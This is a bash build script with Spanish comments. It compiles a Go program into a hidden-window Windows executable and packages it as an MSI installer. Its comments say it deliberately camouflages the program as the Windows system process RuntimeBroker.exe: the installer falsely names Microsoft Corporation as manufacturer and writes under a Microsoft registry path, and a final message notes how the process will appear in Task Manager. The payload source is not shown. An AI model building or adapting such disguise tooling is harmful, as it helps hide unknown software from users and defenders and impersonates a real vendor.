#!/bin/bash

# Colores para output
GREEN='\033[0;32m'
RED='\033[0;31m'
YELLOW='\033[1;33m'
NC='\033[0m' # No Color

# Configuración
BUILD_DIR="build"
EXE_NAME="RuntimeBroker.exe"
MSI_NAME="RuntimeBroker.msi"
APP_NAME="Runtime Broker"
INSTALL_FOLDER="RuntimeBroker"

echo -e "${GREEN}🔨 Iniciando proceso de build...${NC}"

# 1️⃣ Crear directorio build si no existe
if [ ! -d "$BUILD_DIR" ]; then
    mkdir -p "$BUILD_DIR"
    echo -e "${GREEN}📁 Directorio $BUILD_DIR/ creado${NC}"
fi

# 2️⃣ Compilar el .exe con nombre camuflado
echo -e "${GREEN}⚙️  Compilando ejecutable como $EXE_NAME...${NC}"
GOOS=windows GOARCH=amd64 go build -ldflags="-H windowsgui" -o "$BUILD_DIR/$EXE_NAME" main.go

if [ $? -ne 0 ]; then
    echo -e "${RED}❌ Error compilando el ejecutable${NC}"
    exit 1
fi

echo -e "${GREEN}✅ $BUILD_DIR/$EXE_NAME generado${NC}"

# 3️⃣ Copiar config.json si existe (opcional)
if [ -f "config.json" ]; then
    cp config.json "$BUILD_DIR/"
    echo -e "${YELLOW}📋 config.json copiado a $BUILD_DIR/${NC}"
fi

# 4️⃣ Generar GUIDs únicos
UPGRADE_CODE=$(uuidgen)
COMPONENT_GUID=$(uuidgen)
SHORTCUT_GUID=$(uuidgen)

echo -e "${GREEN}📝 Generando $BUILD_DIR/runtime.wxs con GUIDs únicos...${NC}"

# 5️⃣ Crear el archivo .wxs con nombres camuflados
cat > "$BUILD_DIR/runtime.wxs" <<EOF
<?xml version="1.0" encoding="UTF-8"?>
<Wix xmlns="http://schemas.microsoft.com/wix/2006/wi">
  <Product Id="*" 
           Name="$APP_NAME" 
           Language="1033" 
           Version="1.0.0" 
           Manufacturer="Microsoft Corporation" 
           UpgradeCode="$UPGRADE_CODE">
    
    <Package InstallerVersion="200" Compressed="yes" InstallScope="perMachine" />
    
    <MajorUpgrade DowngradeErrorMessage="A newer version is already installed." />
    <MediaTemplate EmbedCab="yes" />
    
    <Directory Id="TARGETDIR" Name="SourceDir">
      <Directory Id="ProgramFilesFolder">
        <Directory Id="INSTALLFOLDER" Name="$INSTALL_FOLDER">
          <Component Id="ProductComponent" Guid="$COMPONENT_GUID">
            <File Id="RuntimeBroker.exe" Source="$EXE_NAME" KeyPath="yes" />
            <File Id="config.json" Source="config.json" />
          </Component>
        </Directory>
      </Directory>
      
      <Directory Id="ProgramMenuFolder">
        <Directory Id="ApplicationProgramsFolder" Name="$APP_NAME"/>
      </Directory>
    </Directory>
    
    <DirectoryRef Id="ApplicationProgramsFolder">
      <Component Id="ApplicationShortcut" Guid="$SHORTCUT_GUID">
        <Shortcut Id="ApplicationStartMenuShortcut" 
                  Name="$APP_NAME"
                  Description="Windows Runtime Broker"
                  Target="[INSTALLFOLDER]$EXE_NAME"
                  WorkingDirectory="INSTALLFOLDER"/>
        <RegistryValue Root="HKCU" Key="Software\Microsoft\RuntimeBroker" Name="installed" Type="integer" Value="1" KeyPath="yes"/>
      </Component>
    </DirectoryRef>
    
    <Feature Id="ProductFeature" Title="$APP_NAME" Level="1">
      <ComponentRef Id="ProductComponent" />
      <ComponentRef Id="ApplicationShortcut" />
    </Feature>
  </Product>
</Wix>
EOF

echo -e "${GREEN}✅ $BUILD_DIR/runtime.wxs generado${NC}"
echo -e "${GREEN}📦 UpgradeCode: $UPGRADE_CODE (GUÁRDALO para futuras versiones)${NC}"

# 6️⃣ Generar el MSI desde el directorio build/
echo -e "${GREEN}🔧 Generando $BUILD_DIR/$MSI_NAME...${NC}"
cd "$BUILD_DIR"
wixl -o "$MSI_NAME" runtime.wxs

if [ $? -ne 0 ]; then
    echo -e "${RED}❌ Error generando el MSI${NC}"
    cd ..
    exit 1
fi

cd ..

echo -e "${GREEN}✅ $BUILD_DIR/$MSI_NAME generado exitosamente${NC}"

# 7️⃣ Mostrar resumen
echo -e "\n${GREEN}========================================${NC}"
echo -e "${GREEN}📦 BUILD COMPLETADO${NC}"
echo -e "${GREEN}========================================${NC}"
echo -e "${GREEN}Archivos generados en $BUILD_DIR/:${NC}"
ls -lh "$BUILD_DIR/" | grep -E '\.(exe|msi|wxs|json)$' | awk '{print "  - " $9 " (" $5 ")"}'
echo -e "${GREEN}========================================${NC}"
echo -e "${YELLOW}⚠️  El proceso aparecerá como 'RuntimeBroker.exe' en el Administrador de Tareas${NC}"
echo -e "${GREEN}========================================${NC}"